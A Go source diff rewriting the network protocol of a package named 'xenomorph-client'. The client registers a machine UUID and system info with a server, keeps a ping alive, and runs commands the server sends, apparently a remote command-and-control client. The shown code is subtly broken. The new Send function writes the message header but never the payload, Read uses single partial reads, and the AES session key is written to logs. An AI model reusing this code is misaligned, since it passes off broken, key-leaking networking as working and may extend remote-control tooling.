@@ -1,17 +1,18 @@
 package client
 
 import (
-	"bufio"
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"net"
 	"time"
 
 	"github.com/codevault-llc/xenomorph-client/internal/command"
-	"github.com/codevault-llc/xenomorph-client/internal/protocol"
 	"github.com/codevault-llc/xenomorph-client/internal/secure"
 	"github.com/codevault-llc/xenomorph-client/internal/services/system"
 	"github.com/codevault-llc/xenomorph-client/pkg/logger"
+	"github.com/codevault-llc/xenomorph-client/pkg/types"
+	"github.com/codevault-llc/xenomorph-client/pkg/utils"
 	"go.uber.org/zap"
 )
 
@@ -59,47 +60,173 @@ func (c *Client) Run() error {
 		return err
 	}
 
+	c.Send(types.MsgConnect, 0, 0, []byte(system.GetUUID()))
+	c.ExpectAckOrHandshake()
+
 	go c.keepAlive()
 
-	connectMsg := protocol.NewMessage(protocol.TypeConnect, map[string]any{
-		"uuid": system.GetUUID(),
-	})
-	c.Send(connectMsg)
-
+	
 	info := system.Info()
-	c.Send(protocol.NewMessage(protocol.TypeConnection, info))
+	infoBytes, err := json.Marshal(info)
+	if err != nil {
+		logger.GetLogger().Error("Failed to marshal registration info", zap.Error(err))
+		return err
+	}
+
+	c.Send(types.MsgRegistration, 0, 0, infoBytes)
 
 	command.InitCommands()
 
-	scanner := bufio.NewScanner(c.Conn)
-	for scanner.Scan() {
-		raw := scanner.Bytes()
-		msg, err := protocol.ParseMessage(c.Sec, raw)
+	for {
+		msgType, _, msgID, payload, err := c.Read()
 		if err != nil {
-			logger.GetLogger().Error("Failed to parse message", zap.Error(err), zap.ByteString("raw", raw))
+			logger.GetLogger().Error("Failed to read message", zap.Error(err))
 			continue
 		}
 
-		c.Handler.Handle(msg)
-	}
+		if msgType == types.MsgPing {
+			logger.GetLogger().Debug("Received ping message")
+			continue
+		}
 
-	return scanner.Err()
+		if msgType == types.MsgCommand {
+			c.Handler.Handle(c.Conn, msgID, payload)
+		}
+	}
 }
 
-// Send sends a message to the server after encrypting and serializing it.
-// It handles errors during serialization and logs them.
-func (c *Client) Send(msg protocol.Message) {
-	data, err := msg.EncryptAndSerialize(c.Sec)
-	if err != nil {
-		logger.GetLogger().Error("Failed to serialize message", zap.Error(err), zap.String("type", msg.Type))
+// Send sends a message to the server with the specified type, flags, message ID, and payload.
+// If the payload is encrypted, it encrypts the payload using the secure connection manager.
+// If the flags indicate that the payload should be compressed, it compresses the payload before sending
+func (c *Client) Send(msgType byte, flags byte, msgID uint32, payload []byte) {
+	// encrypt the payload
+	if c.Sec != nil {
+		var err error
+		payload, err = c.Sec.Encrypt(payload)
+		if err != nil {
+			logger.GetLogger().Error("Failed to encrypt payload", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
+			return
+		}
+	}
+	
+	if flags&0x1 != 0 { // compression flag
+		payload = utils.Compress(payload)
+	}
+
+	totalLen := 10 + len(payload) // 4+1+1+4 = 10 header bytes
+	header := make([]byte, 10)
+	binary.BigEndian.PutUint32(header[0:], uint32(totalLen))
+	header[4] = msgType
+	header[5] = flags
+	binary.BigEndian.PutUint32(header[6:], msgID)
+
+	if c.Conn == nil {
+		logger.GetLogger().Error("Connection is nil, cannot send message", zap.String("type", fmt.Sprintf("%d", msgType)))
 		return
 	}
 
-	// Send header
-	header := make([]byte, 4)
-	binary.BigEndian.PutUint32(header, uint32(len(data)))
-	c.Conn.Write(header)
-	c.Conn.Write(data)
+	_, err := c.Conn.Write(header)
+	if err != nil {
+		logger.GetLogger().Error("Failed to send message header", zap.Error(err), zap.String("type", fmt.Sprintf("%d", msgType)))
+		return
+	}
+}
+
+// Read reads a message from the server connection.
+// It reads the message header to extract the total length, message type, flags, and message ID.
+// It then reads the payload based on the total length minus the header size.
+// If the flags indicate that the payload is compressed, it decompresses the payload.
+// If the secure connection manager is set, it decrypts the payload.
+func (c *Client) Read() (msgType byte, flags byte, msgID uint32, payload []byte, err error) {
+	header := make([]byte, 10)
+	if _, err = c.Conn.Read(header); err != nil {
+		return
+	}
+
+	totalLen := binary.BigEndian.Uint32(header[0:])
+	msgType = header[4]
+	flags = header[5]
+	msgID = binary.BigEndian.Uint32(header[6:])
+
+	payload = make([]byte, totalLen-10)
+	if _, err = c.Conn.Read(payload); err != nil {
+		return
+	}
+
+	if flags&0x1 != 0 { // compression flag
+		payload, err = utils.Decompress(payload)
+		if err != nil {
+			logger.GetLogger().Error("Failed to decompress payload", zap.Error(err), zap.ByteString("payload", payload))
+			return
+		}
+	}
+
+	if c.Sec != nil {
+		payload, err = c.Sec.Decrypt(payload)
+		if err != nil {
+			logger.GetLogger().Error("Failed to decrypt payload", zap.Error(err), zap.ByteString("payload", payload))
+			return
+		}
+	}
+
+	return
+}
+
+// ExpectAck waits for an acknowledgment message from the server.
+func (c *Client) ExpectAck() (bool, error) {
+	for {
+		msgType, _, _, payload, err := c.Read()
+		if err != nil {
+			logger.GetLogger().Error("Failed to read acknowledgment message", zap.Error(err))
+			return false, err
+		}
+
+		if msgType == types.MsgAck {
+			logger.GetLogger().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
+			return true, nil
+		} else {
+			logger.GetLogger().Warn("Expected MsgAck but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
+			return false, fmt.Errorf("expected MsgAck but received %d", msgType)
+		}
+	}
+}
+
+// ExpectAckOrHandshake waits for either an acknowledgment or a handshake message from the server.
+func (c *Client) ExpectAckOrHandshake() (bool, error) {
+	for {
+		msgType, _, _, payload, err := c.Read()
+		if err != nil {
+			logger.GetLogger().Error("Failed to read acknowledgment or handshake message", zap.Error(err))
+			return false, err
+		}
+
+		switch msgType {
+			case types.MsgAck:
+				logger.GetLogger().Info("Received acknowledgment from server", zap.ByteString("payload", payload))
+				return true, nil
+			case types.MsgHandshake:
+				var handshake types.HandshakePayload
+
+				if err := json.Unmarshal(payload, &handshake); err != nil {
+					logger.GetLogger().Error("Failed to unmarshal handshake payload", zap.Error(err), zap.ByteString("payload", payload))
+					return false, err
+				}
+
+				if handshake.Encryption == "aes-gcm" {
+					if err := c.Sec.InitFromRawKey(handshake.Key); err != nil {
+						logger.GetLogger().Error("Failed to initialize secure connection with provided key", zap.Error(err), zap.ByteString("key", handshake.Key))
+						return false, err
+					} else {
+						logger.GetLogger().Info("Secure connection established with AES-GCM encryption", zap.ByteString("key", handshake.Key))
+					}
+				}
+
+				return true, nil
+			default:
+				logger.GetLogger().Warn("Expected MsgAck or MsgHandshake but received different message type", zap.Uint8("msgType", msgType), zap.ByteString("payload", payload))
+				return false, fmt.Errorf("expected MsgAck or MsgHandshake but received %d", msgType)
+		}
+	}
 }
 
 // keepAlive sends a ping message every 30 seconds to keep the connection alive.
@@ -109,9 +236,10 @@ func (c *Client) keepAlive() {
 	for {
 		select {
 		case <-ticker.C:
-			ping := protocol.NewMessage(protocol.TypePing, nil)
-			c.Send(ping)
+			c.Send(types.MsgPing, 0, 0, []byte{})
+			logger.GetLogger().Debug("Sent keep-alive ping")
 		case <-c.KeepAlive:
+			ticker.Stop()
 			return
 		}
 	}
